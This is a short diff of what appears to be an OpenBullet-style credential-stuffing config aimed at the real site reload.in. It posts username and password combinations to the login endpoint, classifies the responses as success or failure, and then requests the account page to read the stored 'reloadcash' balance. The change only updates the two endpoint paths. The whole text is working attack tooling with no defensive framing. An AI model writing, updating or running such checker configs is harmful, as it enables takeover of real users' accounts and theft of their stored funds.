@@ -25,7 +25,7 @@
 }
 
 [SCRIPT]
-REQUEST POST "https://www.reload.in/login/signin/" 
+REQUEST POST "https://www.reload.in/login/" 
   CONTENT "loginemail=<USER>&loginpassword=<PASS>" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
   HEADER "Host: www.reload.in" 
@@ -43,7 +43,7 @@ KEYCHECK
     KEY "1" 
   KEYCHAIN Failure OR 
     KEY "10" 
-REQUEST GET "https://www.reload.in/myaccount/reloadCash/" 
+REQUEST GET "https://www.reload.in/myaccount/bro/" 
   CONTENT "\"head-reloadcash\"" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
